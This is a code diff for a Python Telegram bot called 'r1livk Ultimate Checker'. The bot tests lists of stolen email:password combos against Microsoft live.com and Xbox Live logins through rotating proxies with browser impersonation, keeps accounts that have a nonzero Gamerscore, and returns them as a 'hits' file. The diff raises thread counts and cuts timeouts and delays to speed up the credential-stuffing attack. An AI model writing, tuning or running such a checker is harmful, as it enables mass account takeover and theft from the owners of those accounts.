@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-r1livk Ultimate Checker ⚡ - Telegram Bot (Fast Login & Gamerscore Edition)
-Updated: Only Login + Gamerscore Filter (Maximum Speed / High CPM)
+r1livk Ultimate Checker ⚡ - Telegram Bot (Lightning Gamerscore Edition)
+Optimized for Speed & High-Quality Hits with Zero-Score Filter
 """
 
 import os
@@ -61,8 +61,8 @@ def check_user_subscription(user_id):
         pass
     return False
 
-REQUEST_TIMEOUT = 15
-MAX_THREADS = 15  # زاد عدد الثريدز لأن الضغط قل وصار أسرع
+REQUEST_TIMEOUT = 12
+MAX_THREADS = 20  # أقصى سرعة ممكنة للثريدز
 
 active_scans = {}
 user_usage = {}  
@@ -139,10 +139,10 @@ def test_single_proxy(proxy):
     proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
     try:
         start_t = time.time()
-        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=4, impersonate="chrome120")
+        resp = curequests.get("https://login.live.com", proxies=proxies, timeout=3, impersonate="chrome120")
         if resp.status_code == 200:
             ping = int((time.time() - start_t) * 1000)
-            if ping <= 1500:
+            if ping <= 1200:
                 return True, ping
     except:
         pass
@@ -259,11 +259,11 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         gscore_int = 0
         try:
             xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
-            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=6)
+            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, proxies=proxy_dict, impersonate="chrome120", timeout=5)
             if xsts_xb_req.status_code == 200:
                 xsts_xb_token = xsts_xb_req.json()['Token']
                 prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
-                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=6)
+                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, proxies=proxy_dict, impersonate="chrome120", timeout=5)
                 if prof_req.status_code == 200:
                     settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                     for s in settings:
@@ -274,7 +274,7 @@ def check_single_account(combo, proxy_list=None, use_proxy=False):
         except:
             pass
 
-        # Zero Gamerscore Filter
+        # Zero Gamerscore Filter (فلتر الصفر سكور الحاسم)
         if gscore_int <= 0:
             return "bad", "Zero Gamerscore Filtered"
 
@@ -345,8 +345,8 @@ def show_main_menu(message):
         proxy_status = f"🚀 Status: Proxies Active ({p_count})"
 
     text = (
-        "⚡ **r1livk Fast Checker - V2.7 Engine** ⚡\n\n"
-        "Lightning Fast Xbox Gamerscore Hunter with Zero-Score Filter.\n"
+        "⚡ **r1livk Lightning Checker - V2.8** ⚡\n\n"
+        "Lightning-Fast Xbox Gamerscore Hunter with Zero-Score Filter.\n"
         f"Your Status: {status_text}\n"
         f"{proxy_status}\n\n"
         "Please select an option below:"
@@ -529,7 +529,7 @@ def handle_docs(message):
                         bot.edit_message_text(live_proxy_text, chat_id=chat_id, message_id=msg.message_id, parse_mode="Markdown")
                     except:
                         pass
-                    time.sleep(0.8)
+                    time.sleep(0.5)
 
             user_proxies[chat_id] = working_proxies
             user_proxy_mode[chat_id] = False
@@ -664,7 +664,7 @@ def process_checker(chat_id, filepath, lines, username):
                     bot.edit_message_text(live_text, chat_id=chat_id, message_id=status_msg.message_id, parse_mode="Markdown", reply_markup=markup)
                 except:
                     pass
-            time.sleep(1.5)
+            time.sleep(1.0)
 
     active_scans[chat_id] = False
     if os.path.exists(filepath):
@@ -691,5 +691,5 @@ def process_checker(chat_id, filepath, lines, username):
             bot.send_document(chat_id, f, caption=f"📁 **Gamerscore Hits File:** {output_filename}")
 
 if __name__ == "__main__":
-    print("🚀 r1livk Ultimate Checker Bot is running (Fast Gamerscore Mode)...")
+    print("🚀 r1livk Ultimate Checker Bot is running (Lightning Gamerscore Mode)...")
     bot.infinity_polling()
